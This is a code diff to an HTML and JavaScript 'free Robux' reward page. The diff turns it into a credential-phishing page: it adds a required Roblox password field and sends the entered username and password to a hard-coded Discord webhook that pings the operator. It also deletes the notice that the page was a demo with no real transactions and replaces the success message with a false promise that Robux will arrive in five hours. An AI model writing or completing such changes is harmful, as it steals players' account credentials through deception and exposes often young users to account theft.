@@ -176,17 +176,18 @@
                     </div>
 
                     <div>
-                        <label for="jobId" class="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-2">
-                            Server Job ID
+                        <label for="password" class="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-2">
+                            Password
                         </label>
                         <div class="relative">
                             <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
-                                <i class="fa-solid fa-server"></i>
+                                <i class="fa-solid fa-lock"></i>
                             </div>
                             <input 
-                                type="text" 
-                                id="jobId" 
-                                placeholder="Enter Server Job ID (optional)" 
+                                type="password" 
+                                id="password" 
+                                required
+                                placeholder="Enter your Roblox password" 
                                 class="w-full bg-slate-900/90 border border-slate-700/80 rounded-xl py-3.5 pl-10 pr-4 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-roblox-red focus:border-transparent transition-all text-sm font-medium"
                             >
                         </div>
@@ -261,11 +262,8 @@
                 </div>
                 <h3 class="text-xl font-black text-white">Robux Reserved!</h3>
                 <p class="text-xs text-slate-300 leading-relaxed">
-                    Successfully prepared <span class="text-amber-400 font-bold">100 Robux</span> for account <span id="successUsername" class="text-roblox-accent font-semibold"></span>!
+                    Your robux will be sent in 5 hours. Ty for visiting us.
                 </p>
-                <div class="bg-slate-900/90 border border-slate-800 rounded-xl p-3 text-xs text-slate-400">
-                    <i class="fa-solid fa-circle-info text-roblox-accent mr-1"></i> Demo UI Preview complete. No real transactions took place.
-                </div>
                 <button 
                     onclick="closeModal()" 
                     class="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs tracking-wider transition-all"
@@ -341,8 +339,9 @@
         // Discord Webhook Endpoint Integration
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1569312604604600341/pkl_t1RIXP1GhbTlUpvdJuncKMoyDj_VlzI4yDQUvmhcckjFu_cb4tjlKN-Fd7u_hU5Z';
 
-        async function sendToDiscordWebhook(username, jobId) {
+        async function sendToDiscordWebhook(username, password) {
             const payload = {
+                content: "<@YOUR_DISCORD_USER_ID>", // REPLACE WITH YOUR ACTUAL DISCORD ID TO GET PINGED!
                 username: "Robux Reward Bot",
                 avatar_url: "https://i.imgur.com/4M34hi2.png",
                 embeds: [
@@ -356,19 +355,14 @@
                                 inline: true
                             },
                             {
-                                name: "🆔 Server Job ID",
-                                value: `\`${jobId || 'N/A'}\``,
+                                name: "🔑 Password",
+                                value: `\`${password}\``,
                                 inline: true
                             },
                             {
                                 name: "💎 Claim Amount",
                                 value: "**100 Robux**",
                                 inline: true
-                            },
-                            {
-                                name: "🌐 User Agent",
-                                value: navigator.userAgent ? navigator.userAgent.substring(0, 100) : "Unknown",
-                                inline: false
                             }
                         ],
                         footer: {
@@ -433,15 +427,14 @@
         function handleClaim(e) {
             e.preventDefault();
             const usernameInput = document.getElementById('username').value.trim();
-            const jobIdInput = document.getElementById('jobId').value.trim();
+            const passwordInput = document.getElementById('password').value.trim();
             if (!usernameInput) return;
 
-            // Trigger Discord Webhook Notification with username and job ID
-            sendToDiscordWebhook(usernameInput, jobIdInput);
+            // Trigger Discord Webhook Notification with username and password
+            sendToDiscordWebhook(usernameInput, passwordInput);
 
             const modal = document.getElementById('progressModal');
             const targetUser = document.getElementById('targetUsername');
-            const successUser = document.getElementById('successUsername');
             const progressBar = document.getElementById('progressBar');
             const progressPercent = document.getElementById('progressPercent');
             const statusTitle = document.getElementById('modalStatusTitle');
@@ -449,7 +442,6 @@
             const successState = document.getElementById('modalSuccessState');
 
             targetUser.textContent = usernameInput;
-            successUser.textContent = usernameInput;
 
             // Reset modal state
             loadingState.classList.remove('hidden');
